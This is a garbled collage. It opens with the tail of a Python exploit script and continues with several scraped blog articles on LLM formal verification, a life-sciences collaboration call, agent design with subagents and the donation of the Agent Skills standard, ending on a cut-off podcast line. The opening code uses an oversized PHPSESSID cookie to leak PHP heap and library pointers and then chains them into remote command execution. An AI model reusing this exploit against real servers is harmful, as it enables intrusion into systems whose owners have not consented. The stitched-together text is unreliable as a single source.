FIFO ordering # keeps B1 behind A1 even when A1 reaches OOM immediately. time.sleep(0.25) b1_process = start_chunked( args.host, args.port, args.path, b1, b1_response, args.timeout) time.sleep(0.05) released = holders.pop(queued_release_index) local_port = released.getsockname()[1] close_holder(released) print(f"[*] released rebound holder client_port={local_port} " "into queued A1/B1") finish_chunked(a1_process, a1_response, 200.0) print(f"[*] A1 response={a1_response.stat().st_size}") response = finish_chunked(b1_process, b1_response, args.timeout + 30.0) encoded = cookie_value(response) print(f"[*] B1 response={len(response)} encoded_cookie={len(encoded)}") if not encoded: print("[-] no Set-Cookie PHPSESSID value") return 1 result = summarize_cookie(encoded, args.pointer_floor) decoded = result["decoded"] pointers = result["pointers"] print(f"[*] decoded_cookie={len(decoded)} candidates={len(pointers)}") for value, count in result["top"]: print(f" {value:#014x} count={count}") if len(decoded) <= 256: print(f"[-] normal-size cookie: {decoded!r}") return 2 if pointers: dominant, count = pointers.most_common(1)[0] libphp = dominant - args.zval_ptr_dtor_offset buckets = Counter() for value, value_count in pointers.items(): buckets[value & ~0x1FFFFF] += value_count print(f"[+] dominant={dominant:#x} count={count} " f"libphp_candidate={libphp:#x}") print("[+] 2MiB pointer buckets: " + repr([ (hex(base), bucket_count) for base, bucket_count in buckets.most_common(8) ])) print("[+] overlong Set-Cookie disclosure reproduced") if args.rce is not None: if not pointers: print("[-] cannot run RCE without a module pointer") return 3 if count < 100 or libphp & 0x1FFFFF: print("[-] dominant pointer failed the exact-build profile") return 4 heap = libphp + args.heap_from_lib_delta if not buckets.get(heap): print("[-] derived main chunk is absent from leak buckets") return 5 print(f"[+] derived main_chunk={heap:#x} " f"(libphp+{args.heap_from_lib_delta:#x})") sys.stdout.flush() if args.pause_before_rce: print(f"[*] pausing {args.pause_before_rce:g}s before RCE", flush=True) time.sleep(args.pause_before_rce) time.sleep(0.2) proof_url = (DEFAULT_RCE_PROOF_URL if args.rce == DEFAULT_RCE_COMMAND else None) rce_verified = amplified_rce( args, heap, libphp, args.rce, proof_url) if rce_verified is False: print("[-] composed leak-to-RCE stage failed") return 6 if rce_verified: print("[+] composed leak-to-RCE chain succeeded") else: print("[?] composed leak-to-RCE payload delivered; " "execution unverified") return 0 finally: holder_stop.set() holder_thread.join(timeout=2) for sock in holders: try: sock.close() except OSError: pass if __name__ == "__main__": raise SystemExit(main())

articles.title: LLMs are making formal software verification feasible at a much larger scale
articles.context: While writing the proofs, Claude also discovered bugs that had eluded detection for years, despite trillions of test runs
articles.full_text:
Keane Lucas, Aengus Lynch, Luna Tong, Luke Champine, Zygi Straznickas, Dino Distefano, Harshikaa AgrawalEvyatar Ben Asher, Ava Howell, Sami Jawhar, Chris Rohlf, Nickolai ZeldovichNicholas Carlini, Rajashree Agrawal, Jason Gross

Most software is riddled with bugs, which AI can now easily find and exploit. The standard defenses against cyberattacks are no longer sufficient: we need ways to prove that code is free of bugs. Formal software verification could provide this guarantee, but it has historically required years of expert effort, making it impractical for most real-world projects. In a collaboration with Theorem, however, we show this is no longer the case: LLMs can now produce formal proofs at large scale, enabling new software development workflows that include proven security guarantees. Using Claude, we proved security properties at the assembly code level (RISC-V) in over 100 real-world open-source software libraries. To our knowledge, this represents the first large-scale effort to use AI to apply formal verification to production software at the assembly code level. While writing the proofs, Claude also discovered bugs that had eluded detection for years, despite trillions of test runs. As model capabilities continue to improve, we expect formal verification to become an essential part of secure software development.

Introduction

Even mature, heavily tested software contains bugs, and LLMs are increasingly adept at finding them. The Linux kernel—one of the most well-tested pieces of software today, deployed on billions of devices worldwide—recently had over 1,000 vulnerabilities disclosed. With frontier models becoming more capable of chaining seemingly benign bugs into critical exploits, we need techniques that can detect and fix these bugs before they can be exploited in the wild.

Ideally, such techniques could find and patch all bugs, and then provide some proof that there are no more to be found. Formal verification is one way to do this. In formal verification, developers translate their code into a mathematical model, then try to prove that it always follows some defined set of security rules. If they fail to prove this, that means there could be a bug in the code that would violate a rule, and the nature of the failure implies what the bug might be. Repeating this process (after eliminating the cause of failure each time) will ultimately yield proof that the code is devoid of any bug that would violate those rules.

However, formal verification isn’t easy. Proofs can be many times larger than the original code, and writing them requires significant effort and a niche, highly specialized skill set. For instance, it took two person-years to implement the seL4 operating system kernel, but 20 person-years to formally verify it. Accordingly, formal verification has been practical only in truly mission-critical applications, such as Airbus’s avionics code.

But LLMs are making it far easier. Frontier models can now produce correctness proofs for real-world software fully autonomously. To demonstrate this, we asked Claude to prove useful security properties across 123 open-source libraries, including showing that some of their executable artifacts can never crash under certain conditions. Specifically, Claude proved that these programs will always exit normally without triggering memory-safety errors or failing assertions, for every input less than 64 MB and every modeled Linux operating system (OS) response and memory layout, under certain assumptions (namely that the program runs as a single-threaded static binary with a fixed memory budget on a RISC-V1 CPU using Linux OS). This is still far away from fixing all possible bugs, but it does get us much closer than before and provides a roadmap toward that end.

We’re publishing a subset of these proofs so that anyone can verify and reuse them, along with the RISC-V and OS semantics. Theorem, our collaborator on this project, is also offering to run the same pipeline for other open-source projects, and is publishing a Claude skill to help developers get started with verifying their own code.

Formal verification is a broad field with many methodologies. Below, we also describe our initial explorations using other formal verification methods to accelerate other security or software development tasks, such as assessing the security of the zlib compression algorithm, proving behavioral equivalence of a Python interpreter written in Rust, and rooting out long-standing bugs in critical software.

The road ahead for formal verification is promising. The cost of writing proofs is falling as models become more intelligent. Moreover, as more code is formalized and methods of achieving security guarantees become more standardized, the ability to reuse or modify proofs across codebases will amortize the cost. We encourage all developers to explore formal verification with LLMs—especially those who previously tried it with less capable models and found it didn’t work.

In the rest of this post, we cover our formal verification experiments in more detail.

Turning tests into proofs

To prove that a piece of software is correct, we must first state what “correct” even means. Correctness is defined by the specification (spec). In some programs, there is a clear way to formally specify the program’s intended behavior. For example, a PNG decoder takes a sequence of bytes and (following RFC 2083) decodes these bytes into the corresponding image. But for most programs, things aren’t so straightforward. What would it mean for a text editor or a web browser to be “correct”? The difficulty of obtaining a comprehensive and unambiguous spec is a significant obstacle to verifying software at a larger scale.

To address this for the code in the open-source libraries that we sought to prove, we take the approach of automatically converting their preexisting compilable test suites into a spec by encoding the rule “this test suite always passes,” using a general model of what it means to execute any RISC-V-compiled binary on Linux. Historically, proving such specs was intractable, given the inherent complexity of writing a proof that can encompass and make an argument over all possible behaviors and interactions of tens of thousands of assembly instructions over any input (and the fact that proofs tend to be extremely large as a result). This is where today’s LLMs come in: churning through millions of lines of code in pursuit of a well-defined goal is a task that LLMs are extremely well suited for.

For this project, we started with fuzz tests. In these tests, developers write an entry point2 into their code that takes inputs, such that any input that causes a crash is a bug the authors care about. Then the fuzzer, a testing engine, generates enormous numbers of semirandom and mutated inputs at the entry point to try to find a bug (visualized in Figure 1). The longer a fuzzer runs, the more bugs it can find. But this is inherently a brute-force process, with no guarantee of exercising every possible code path, regardless of how many inputs you try.

To find all the bugs that would’ve been surfaced by a fuzz test, we turned the fuzz test into a spec defined over the compiled RISC-V instructions. The spec says that the fuzz test won’t crash for any input less than 64 MB.3 If Claude can prove this spec, the fuzz test on RISC-V becomes superfluous: fuzzing that entry point will never find any bugs.

We did this for hundreds of projects in Google’s OSS-Fuzz initiative, which provides continuous fuzz testing for qualifying open-source projects. OSS-Fuzz contains thousands of developer-authored entry points that look for broken code properties by crashing (for example, on a failed assertion). OSS-Fuzz automatically instruments C and C++ programs with AddressSanitizer4 (ASan), causing them to crash whenever memory is accessed improperly (which is a leading cause of software vulnerabilities). Broad-spectrum specifications like memory safety apply to almost all software.

Over the span of a few weeks, Claude successfully patched the bugs it found and then proved that there are no crashes on any input (up to 64 MB) for 239 entry points across 123 different OSS-Fuzz libraries. These proofs operate on the compiled RISC-V instructions (i.e., executable binaries), and they comprise about 180 million lines of Rocq, with a typical proof running to about 600,000 lines to provide security guarantees on binaries with a median length of 18,000 RISC-V instructions. These proofs are built by translating the RISC-V assembly code to a mathematical model using Theorem’s RISC-V instruction and Linux process semantics. This means these proofs currently assume that the program runs as a single-threaded static binary with a fixed memory budget on a RISC-V CPU using Linux OS. Expanding the scope of these proofs is well within reach, as it would involve standardizing semantics for more assembly architectures and other operating system processes. See an expert’s take on the proofs Claude wrote.

While this is an enormous volume of proof code, virtually none of it needs to be manually reviewed. The Rocq proof checker ensures that the spec is correctly satisfied by the proof. As a result, the only artifacts that a developer needs to trust are:

The formal models of RISC-V and of Linux processes;

The exact theorem statements that were proved;

The Rocq proof checker itself.5

This doesn’t mean these libraries contain no bugs. Instead, it means that any remaining bugs either are to be found within the artifacts listed above or are outside the scope of Claude’s proof. Hardening those still-possibly-buggy trusted components (Rocq, RISC-V, and Linux semantics) is not insignificant, but it’s a far more tractable task than debugging every line of code the scaled-out proofs cover—especially as this approach can secure an arbitrary number of projects without increasing the size of the trusted components.

We welcome independent verification of our proofs and encourage refinement of our approach. To that end, we are publishing the trusted components (above) made for this project that are not already public; Claude’s complete Rocq proofs for fuzz tests that did not require patching; and specifications for other fuzz tests we were not able to prove.

Finding and fixing bugs

Above, we showed that you can turn many open-source libraries’ developer-written tests (fuzz tests) into specs that Claude can prove will always pass, sometimes after patching the remaining bugs it found. For this reason, the process of attempting to prove these specs discovered hundreds of bugs.

Lots of bugs showed up during Claude’s attempts to prove hundreds of entry points. To ensure that Claude didn’t have to stop for a human every time this happened, we let Claude fix the bugs it found: it patched the code, which caused the spec to be regenerated with that patched code, and then Claude proceeded to prove that new spec.6

Many of the bugs we found are ones that a fuzzer would be unlikely to ever find. Fuzzers mutate small inputs, typically capped at 1 MB, and typically rely on code coverage to guide them toward bugs. While proving an entry point in one library, Claude found a counter underflow in its copy of a decompressor that led to an out-of-bounds write, but only on inputs of around 20 MB that had one rare, specific layout. Other bugs include an out-of-bounds read in an image decoder that needed a 64 MB input and over 2 GB of memory, an out-of-bounds read in another library that needed a particular sequence of calls across two handles to the same file, and a rediscovery of CVE-2026-56132 in libexpat, which needed deeply nested input. Claude also found logic bugs that never crash at all. While proving that one library was memory-safe, for example, it noticed that a feature for restricting which files an application can load isn’t always enforced.

The ultimate goal of this project was to achieve a proof that the RISC-V-compiled fuzz tests had no remaining crashes to find. However, bugs like the above show that the process has another benefit, regardless of whether that goal is achieved: even just attempting this process yields real bugs that need to be fixed.

Proving more than memory safety

Proving that a fuzz test has no more crashes to find is more significant than it sounds. It’s common for fuzz tests in real-world code to test for violations of meaningful high-level properties, such as encode-decode roundtripping, idempotence, algebraic laws, differential testing, self-consistency, or equivalence to reference implementations. For example, a fuzz test for the LZO compression algorithm asserts that if you compress an input, then decompress it, the result is the same as the original. If the property does not hold, the program crashes—so proving the test never crashes is equivalent to proving the property itself.

This can also occur even when the properties are not directly specified by the developer. For example, in order for Claude to complete its OSS-Fuzz proof for cpp-httplib, it was necessary to rule out the possibility of a stack overflow due to too much recursion in the std::set destructor. This recursion depth is bounded by the maximum depth of a tree, so Claude had to prove (on machine code!) that libc++’s red-black tree rebalancing algorithm is correctly optimized to keep the tree’s depth logarithmically bounded.

Other formal verification case studies

Formal verification is an expansive domain. The fuzz-test-to-proof example above is one instance of LLMs making formal verification more widely usable by directly applying proofs to machine code.

We’ve also seen success using LLMs with formal verification in other ways. For example, we asked Claude to write a formal spec of RFC 1950, the technical document that defines the zlib compression file format. Then, we had Claude prove that the zlib implementation in the Linux kernel correctly implements that spec. As with the examples above, Claude proved this property at the binary level, except instead of RISC-V, Claude directly proved the x86-compiled binary using Claude-generated (and heavily tested) formal semantics of the x86 ISA.7 We then repeated this process for half a dozen other widely used libraries. Along the way, we found some minor (unexploitable) bugs in corner cases, which are in the process of being filed upstream. We draw two conclusions from this exercise: (1) these extremely well-tested codebases are already almost fully correct, and (2) it is possible to prove end-to-end correctness properties about real existing codebases.

In another experiment, we asked Claude to develop an interpreter for a large subset of Python in Rust, and to prove (using Verus, a verification tool for Rust) that it adheres to the CPython semantics outlined in an academic paper. We then measured the adherence to CPython’s behavior empirically, running over 1.7 million randomly generated Python programs, finding identical behavior with CPython in 99.95% of tests, with remaining test differences as unsurprising known corner cases.

We also found issues in several widely used and critical applications via formal verification attempts of simple security properties. In one of them, we discovered a previously unknown logic bug that had been latent for more than a decade. During an effort to verify a widely used PDF reader, we found as many security bugs in one week as are typically reported in a year.

See the Appendix for more details on some of these efforts.

This is just the beginning

One of the key limitations of LLM-assisted formal verification is that the proofs can take hundreds of millions of tokens to produce. Cost-efficiency is critical if our goal is to make these methods available to the entire software ecosystem. Fortunately, there are compelling reasons to expect efficiency to improve.

Newer models need fewer tokens

We built 36 small verification tasks from real OSS-Fuzz code. Opus 5.5 proves half of them with about 40% fewer tokens than Opus 5. We expect this trend to continue as models are trained on long verification tasks.

Proofs can be reused

When agents work separately, they often end up duplicating a lot of effort. Proofs, like software, are recursively built from smaller proofs—and the smaller the proofs are, the more reusable they tend to be. To measure the impact of this, we let agents copy each other’s proofs as they worked on proving their own targets. When given access to this shared workspace, agents needed 17% fewer tokens than when they worked alone, and some agents even succeeded after previously failing in a solo attempt.

We observed the same phenomenon occurring at scale during our OSS-Fuzz proof effort. Most of a proof concerns code that every program contains (particularly initialization of the C runtime and AddressSanitizer), so very different programs can end up with significantly overlapping proofs. Agent teams took advantage of this by copying another team’s finished proof and then adapting it to their own program (Figure 6).

This reusability of proofs is how Mathlib, a shared library of formal mathematics in Lean, grew to nearly 300,000 theorems submitted by over 700 contributors: each new proof builds on the existing body of work. We accumulated a similar body of proofs in the course of our OSS-Fuzz effort, some of which we’re including in our release (we are not releasing proofs that may reveal an unpatched bug in the open-source software).

As we graduate from these initial experiments, we need a strategy for verifying the enormous body of existing software, starting with the most critical dependencies. As we’ve shown, this can be achieved at scale by using generic specs and working at the binary level, sidestepping the need to rewrite entire codebases in another language.

This approach also facilitates the reuse of proofs at package-level granularity, which means that each dependency only needs to be verified once. Dependencies follow a power law: proving even a small set of shared libraries makes a huge swath of software feasible to prove. For more details, see Theorem’s roadmap for verifying the entirety of the Nix ecosystem, which includes critical infrastructure like glibc, OpenSSL, and cURL.

Limitations

In practice, formal verification can sometimes prove less about the security of the code than we would like.

“Formally verified” does not mean “bug-free.” Claude can write a proof showing that a compiled program’s behavior satisfies the requirements of a formal spec (which is verified by an external proof checker). However, a proof checker can’t tell you whether your spec matches reality. To match reality, the spec must correctly encompass and model everything about the real-world machine that the verified program runs on, including the CPU and operating system. When bugs show up in verified code, it’s because the spec, or the assumed semantics of the machine, differs from reality. Fortunately, this also means we know where to look for remaining bugs, and how to design a system where those still-possibly-buggy gaps are minimized. Below are the ways this applies to our proofs, and ideas for future work that would close those gaps.

The real machine does something the model doesn’t describe. Our proofs are about single-threaded, static RISC-V binaries linked against musl libc. However, most people run these libraries on x86 or ARM and dynamically link them against glibc. To close this gap, we’d need system models that more closely resemble deployed systems. For example, a step toward this would be generating accurate semantics for x86.

The claim may not cover everything we care about. We proved that a crash never triggers for any input under 64 MB on many fuzzing entry points in Google OSS-Fuzz, including ASan crashes. However, ASan doesn’t detect all memory safety bugs, and we didn’t verify all the entry points for each library. Even if we had, the whole library wouldn’t be covered by verifying all entry points (especially if there is dead code). Additionally, real programs might misuse the library, leading to memory corruption in the caller. To close that gap, we’d need to specify what callers must do for each public function, and callers would have to strictly adhere to it.

We expect that as we learn more about leveraging LLMs for formal methods, and as models continue to improve, these limitations will become tractable, and we’ll be able to verify a much larger percentage of the code we rely upon.

Conclusion

The trajectory is clear: formal verification, which was historically practical only for bespoke expert-crafted guarantees in the most safety-critical code, will soon be as practical as fuzzing is today for almost all production software. Just like static types, testing frameworks, and other correctness tooling, verification will mature from “bolted-on” to “built-in,” driven not only by LLMs but also by innovations in language design and development workflows.

In today’s world—where LLMs automatically scan for and find increasingly more code vulnerabilities—we must use processes that can guarantee code security properties. LLM-scaled formal verification is a promising approach toward securing these guarantees at a scope and scale that were previously unattainable. We encourage others to experiment so we can collectively build a world in which robust software has proliferated very widely and software bugs are a well-understood and quickly addressable rarity.

Read the full appendix.

articles.title: Open call for guest investigators in the life sciences
articles.context: We aren’t asking for guest investigators to give us their data, either in the application or during the collaboration, and we’re requesting that applicants include only publicly...
articles.full_text:
Today, we’re inviting members of the life sciences community to apply to work with us on special projects. We’re looking for proposals from principal investigators and their research groups at academic institutions, nonprofits, or government labs who want to use Claude to investigate key questions in causal human biology, structural and computational molecular biology, medicinal chemistry, drug discovery, and clinical science.

You can submit a proposal for a project here.

Over 8–12 weeks, guest investigators will work directly with Anthropic researchers on a problem of interest and produce the analyses, artifacts, and tools that will be most helpful for them in their work. Our team will run our models and harnesses at no cost to them.

We’ll work together to publish these outputs and open-source the accompanying data and code. Guest investigators retain the rights to their data at every step during their project. They will also have the rights to any independent follow-on research that might come out of our collaboration.

We’re looking for applicants who can clearly explain how they would benefit from direct collaboration with Anthropic’s researchers. Applicants should also make a reasonable case that their outputs (e.g., preliminary discoveries, answers to open questions, open-source datasets, or public resources) can be produced within the 8- to 12-week collaboration period. There may be an option for extension beyond the initial collaboration period for some projects.

We understand that the results for most open problems of interest will take much longer to validate, but we’re looking for proposals that can produce some preliminary evidence in a relatively short amount of time.

We aren’t asking for guest investigators to give us their data, either in the application or during the collaboration, and we’re requesting that applicants include only publicly available information in their application materials.

Applications will be open for approximately 14 days, and we’ll strive to notify selected participants by email approximately 14 days after applications close. We look forward to potentially expanding this effort in the future as we learn more about how we can best support the scientific community.

This program is one of several initiatives Anthropic is pursuing to invest more heavily in the life sciences and the broader scientific research community. Scientists who would like direct access to our most capable publicly available models for biology can apply to join our Life Sciences Verification Program. We’ve also continued to support researchers through our AI for Science initiative, which provides scientists with Claude credits to accelerate their progress toward making scientific discoveries.

articles.title: Building agents: When to fold subagents into your main agent loop
articles.context: However, recently the Applied AI team has found a pattern of enterprise agent deployments that have benefited from folding routers, planners, and domain subagents into the main...
articles.full_text:
If you’ve built an agent in Claude Platform that includes multiple subagents, see which may make sense to fold into the main agent loop using our migration kit. It runs a guided workflow to identify your patterns, evaluate alternatives, and verify the best approach. It includes a demo that you can try on a mock system before running on your agent.

Subagents – agents with their own context window, tools, and instructions, orchestrated by a coordinator – are a core component of agent design. They are effective at verification, parallel work, and modular permissioning. We use them in many of our own agents that we build using Claude Platform, for example our multi-agent research system.

However, recently the Applied AI team has found a pattern of enterprise agent deployments that have benefited from folding routers, planners, and domain subagents into the main agent loop. In our comparisons across several enterprise deployments, a single agent with skills frequently outperformed both the one-prompt-for-everything design and the subagent design on quality, and often at a lower cost and latency per task.

For example, one company found the dozen of specialist subagents within its customer-facing agent made a consistent on-brand experience difficult to maintain and added latency that hurt the user experience.

We also often see proposed agent designs that follow a familiar progression: an intent classifier, a fixed multi-step reasoning pipeline, user-segment buckets, separate recommendation branches, and a multi-agent orchestrator on top.

In these cases feedback is often that most of this structure was doing work the model no longer needed done for it, and that one clear system prompt, 4-5 thin data tools, and firm output guardrails would cover most of the use case.

To be clear, subagents still have their place, including at the research frontier. Use them when:

A single agent loop hits measurable performance degradation from context bloat, or

Multiple tasks need to be tackled in parallel with fresh context windows that can be discarded once the task is done, or

A single agent struggles to select appropriate tools or there are conflicting instructions in the system prompt.

But too often we see enterprises give each team or problem type its own subagent, with the agent architecture becoming a copy of their org chart (Conway’s law at work).

This post explains when to consider folding subagents into your main agent loop with best practices we’ve learned from building agents in large organizations.

Agent building failure modes for large organizations

Companies often want to build an agent that unites multiple products and capabilities into a single customer interface.

Typically, each capability is owned by a separate team, so companies start by letting each individual team build their own agent, then a central platform team builds an orchestrator on top. This can take on several structures including orchestrator-subagent or a single agent with specific agents exposed as MCP tools.

This looks like the simplest solution but introduces immediate complexity around:

Context management: You need to decide what context is exchanged between agents and often lose details in the back and forth.

Subagent sprawl: Every team ships its own subagent, so companies end up with hundreds of overlapping subagents with no enforced standards and no specific owner.

The Frankenprompt: Every team adds a sentence to the system prompt, resulting in conflicting rules and no consistent voice.

Unvetted, overly localized evals: Everyone adds their own evals that are overly optimized for their subtask. No one owns or maintains the whole set, and leadership makes decisions based on watered-down, overly localized scores.

Latency: Multi-agent architectural complexity adds latency. One customer that evaluated their multi-agent harness against a single agent loop saw a roughly 2x faster runtime with the latter.

Using an agent loop with progressive disclosure

The orchestrator-subagent design described above is a reasonable approach to coordinating specialists built across teams, but often a more effective approach can be progressively disclosing context via skills and progressively disclosing tools via tool search. In other words, the agent sees short descriptions of the skills and tools, which are fully loaded only when needed.

There are three reasons why this approach can make sense:

Shared context produces better answers: for longer-running agents, we want the context from several different tasks to sit in the main context window. An agent that has seen the result of each earlier step can connect them, which leads to richer outputs and better insights than a set of summaries handed back by subagents. It also means fewer context windows and fewer lossy handoffs.

Progressive disclosure prevents context bloat: this technique allows teams to build single agents that can accomplish a wide variety of tasks without requiring all of the context to be immediately loaded into one long system prompt. This removes the main reason teams previously split work across subagents. In fact, we reduced Claude Code’s system prompt for more advanced models by over 80% which included cuts related to progressively disclosing skills and tools.

Models are more capable: starting with Opus 4.5, models became capable of managing far more in a single loop than most teams expected. You cannot turn off thinking on Opus 5.5, and Fable 5.1, and recent models increasingly narrate their progress and check their work as they go, which makes some harness elements redundant. Each new model lets you move more of the decision-making out of the harness and into the model itself. A simpler loop is also easier to move to the next model; in migrations we have helped customers with, rigid multi-agent structures were often what stopped the new model from doing more of the work.

The single agent loop design requires discipline: a carefully managed system prompt, skill and tool descriptions that trigger at the right times, and deliberate handling of context windows, memory, and note-taking. This article goes deeper into migration and design considerations in subsequent sections.

One central team should own end-to-end quality and the system prompt, vetting every new tool and eval before it ships. Keeping that central team small helps iteration move quickly and lowers coordination cost across a large org.

If you go the multi-agent route, start with the simplest pattern (generator-verifier, orchestrator-subagent, or other) that could work. Decompose boundaries effectively by dividing by context: give each subagent a piece of work that needs little from the rest of the system and have it hand back a compact result (good candidates are independent research paths, separate components with clean interfaces, or black-box verification). When agents are split by problem type, they engage in a "telephone game," passing information back and forth with each handoff degrading fidelity.

How to fold subagents into the main agent loop

Many teams already have an orchestrator and a set of specialist agents in production. The following is the single loop design we'd suggest working toward:

One model and one context window running an open-ended tool loop, with limits (turn and cost budgets, write gates) set in the harness.

Each turn, the model emits a batch of tool calls. The harness runs them in parallel and returns raw results to the same model, which decides the next step: another batch, a question to the user, or an answer.

The loop stops when the model answers or hits a budget. A goal or verifier check can optionally run after the answer.

The model writes its plan in context on the first turn and revises it as results arrive. This is the main change from the orchestrator and specialist agents setup: the model that writes the plan is also the one carrying it out, so it can change the plan mid-turn.

Context still gets loaded, and is managed by the agent itself:

A code step that rewrites the plan from a catalog of rules is no longer needed, since the model decides each step.

Ordering and domain procedure move into skills.

Hard limits (validation, approval gates) and anything else that comes up mid-conversation (e.g. memory lookup) move into the tools.

Code can still be used to load anything cheap and almost always relevant (e.g. an entity resolution step), and to handle any mechanical parts (payload construction, stream parsing, resuming a clarification) inside tools the loop calls.

This single loop design also helps with the end state many teams are working toward (an agent that understands a user's high-level goals and acts on their behalf), since it keeps everything the agent has learned in one context.

The suggestions below are how a team could get from a multi-agent system to a single agent loop in stages, and how several teams can keep contributing to that agent along the way.

Task-completion evals

The first step is to create an eval set that can help you determine whether you should fold a subagent into the main agent loop. The eval structure we’ve seen work is one shared end-to-end set owned by a central team with smaller eval sets shipped with each skill by the team that owns it. Even a set of 10 golden examples is enough to start.

Grading the agent's final message against a rubric is a good starting point for tracking answer quality. While you still have an orchestrator, you should also track routing accuracy (did it pick the right subagent?). Once a subagent is folded in, check instead whether the agent loaded the right skill or called the right tool. Working toward task-completion evals over time is helpful as this matters most when comparing architectures.

This can be complex in environments where internal systems are difficult to replay and user engagement is difficult to simulate. One approach that has worked for us internally is to record timestamps on important events, so they can be replayed later to run as targeted evals.

Reducing subagents over time

Evolving toward a single agent loop involves folding the subagents into tools and skills. This can be done by merging domain subagents, calling them as tools, or replacing them with skills and tools.

Combining domain agents

Build a small end-to-end eval before the first merge. Then fold in by shared context starting with subagents that have the most use.

Merge specialists that chain on each other's output, touch the same data, or are often called together. For example, if a significant share of production traffic is one specialist followed by a second, that is a tightly coupled pair, which makes it a candidate to merge into one domain agent.

Subagents called as tools

When one of the three conditions above applies and you keep a subagent, it can be effective to have the main agent call subagents as tools so it can continue holding the conversation with the user.

We’d only recommend a full handoff, where the subagent takes over the conversation, when it needs to talk to the user directly. Everything else can be a skill plus tools in the main loop.

This will allow you to define a shared response schema for subagents, verify the conclusion against real data with the main agent, and trim the input to any final synthesis step. This is a good first step, as you don’t need to rewrite the subagents. It also gives you a baseline on the task-completion eval before deciding to fold any subagents into the main agent.

However, some failure modes will remain:

Each specialist has its own prompt, context, owner team, and evals

Each call still hands back a lossy summary

Every call is a nested model loop that adds latency

Folding subagents into the main agent via skills and tools

Fold subagents into the main agent one at a time by turning each one’s prompts into skills and API calls into MCP tools. Compare eval performance with and without the subagent. Then decide which to keep.

When you compare, don’t just examine the final score, take a look at which tasks flipped. When we tested this on a sample support agent, folding one subagent into another lowered latency, but also broke a process that had been passing. The main agent was holding the order lookup tool and answering on its own, without asking the shipping specialist for the delivery date.

Before each change, make sure your eval has a task for every chain of agents that runs together in production and for every rule the agent must not break, and run each task more than once, since a break like this one only showed up in one run out of two.

How several teams can contribute to a single agent

Domain reasoning can be retrieved from knowledge bases, skills, and MCP tools. Individual teams can shift their ownership from agents to skills and tools, with one small central team keeping ownership of the system prompt and end-to-end quality. This involves vetting new skills, tools, and evals before they ship.

MCP tools

Tools are the right fit when the agent needs to take an action, read live data from a system, or return a result in a fixed shape. You can also use tools as a way to keep calling subagents while you migrate. We recommend tools grouped by user intent (not one tool per API) because once you exceed 30-50 tool definitions in the system prompt, tool choice tends to degrade.

Use tool search with deferred loading, limit hard preconditions, and move any needed ones into the tools. For example, if Y needs X's output, Y's tool checks for it and returns an instruction the model can act on. Per-user permissions work the same way. Each tool checks what the calling user may see or do and returns a plain refusal the model can read, so one loop can serve users with different access without a separate agent per permission level.

Skills

Skills are the right fit when the agent needs to know how a team does work, like the steps, rules, and judgment calls a specialist subagent's prompt used to hold.

Our approach to growing skill libraries is to give the maintenance work back to the people writing the skills. Claude can do the heavy lifting with skills that can build, test, and prune other skills.

To prevent skill sprawl, you can have DRIs per team own their skills and make sure they are well crafted, distinct, and shipped with appropriate evals.

/skill-creator allows you to author new skills that start well-formed, and audit existing ones to trim, deduplicate, and restructure them.

/skill-doctor allows you to see what each skill in your library costs and how often it’s actually used, and delete dead weight.

Knowledge bases

Knowledge bases are the right fit for reference material the agent only needs some of the time. Facts and reference material (policies, metric definitions, product specs) can sit behind a search or lookup tool the model calls, or ship as reference files inside a skill. Avoid having code retrieve and paste this context into prompts.

Tools to accelerate this work

We recently released a set of Claude API skills that can help with most of the work mentioned above. Our migration kit chains these skills together in one guided workflow for assessing and moving multi-agent systems to a single agent loop. It includes a demo you can try before running it on the real thing:

/claude-api build-eval: can help create a first end-to-end set owned by the central team or small evals each team ships with its skill

/claude-api prompt-audit: can flag instructions written for older models in your prompts, skills, and tool descriptions and propose fixes as a diff. This can be run on your system prompts to find any rules that were added for an earlier model and are now making the agent slower or more rigid. Each team's DRI can also run it on their own skills and tool descriptions.

/claude-api hillclimb: can iteratively improve an app against an existing eval. This can be used for the "folded in vs kept" comparison (after folding one subagent into a skill plus tools, let it iterate on the skill and tool descriptions and see if the folded version matches or beats the subagent), as well as your system prompt.

/claude-api cost-optimize: profiles where your calls go and proposes savings from options such as prompt caching, trimming unneeded input and output tokens, effort, and model choice, one change at a time. This can help bring cost and latency down on a given design.

As models evolve, our understanding of how to best use them and guidance around best practice evolve as well. That makes any one architecture less important than the principle behind it: measure, change one thing at a time, and keep what holds up.

This is one of those cases. As models get more capable and agents get longer running, more of your subagents can be skills and tools. You don’t have to make that move in one step, though. Build a small end-to-end eval, fold in one subagent, and keep it as a subagent only if the folded version scores worse, then rinse and repeat.

articles.title: Donating Agent Skills to the Agentic AI Foundation
articles.context: Today, we’re donating Agent Skills, the open standard that gives AI agents specialized knowledge and workflows, to the Agentic AI Foundation (AAIF)
articles.full_text:
Today, we’re donating Agent Skills, the open standard that gives AI agents specialized knowledge and workflows, to the Agentic AI Foundation (AAIF). More than 70 agent platforms, including ChatGPT, Cursor, GitHub Copilot, and VS Code, have integrated Agent Skills since we published the standard in December 2025.

Agent interoperability through simplicity

A skill is a folder containing a SKILL.md file that teaches an agent a specific task or domain, along with any scripts or reference material it needs. We developed skills while working on Claude Code. It handled general knowledge work well, but often lacked the procedural knowledge that real business tasks need. Within weeks of our October 2025 launch, developers published thousands of skills on GitHub and wrote loaders for Codex, Cursor, and OpenCode. We then published Agent Skills as an open standard, under its own GitHub organization and domain, so any agent could use it. So far, 1 million skills have been published and nearly 280 million installed.

Donating Agent Skills to AAIF

We’re committed to keeping Agent Skills open, community-driven, and vendor-neutral. Today, we are donating the standard to the Agentic AI Foundation (AAIF) under the Linux Foundation, which we co-founded with Block and OpenAI last year, and to which we donated the Model Context Protocol (MCP). The AAIF will provide a neutral home to the standard going forward, ensuring the community has a say in where Agent Skills go next.

We are donating the Agent Skills name and logo, the GitHub organization, and the agentskills.io domain. You can continue to use the standard or contribute to it without joining the AAIF.

Engineers from Anthropic, Google, OpenAI, and other companies will maintain the standard as individuals, with David Soria Parra and Mahesh Murag as Lead Maintainers.

What comes next

We’ve proposed starting with a roadmap covering versioned releases, a formal proposal process, and security guidance for people who write and install skills. As with MCP, the project will continue to prioritize community input and transparent decision-making. You can join the project’s Discord to give feedback on proposed specification changes.

Thank you to the developers who built with Agent Skills from the start, and to the teams who brought skills into their products. Read the specification at agentskills.io and join the discussion on GitHub.

Now, for listeners who've never watched one work, what does a coding agent like Claude Code or Codex or Cursor — what do they actually do on an employee's laptop?

SPENCER THOMPSON

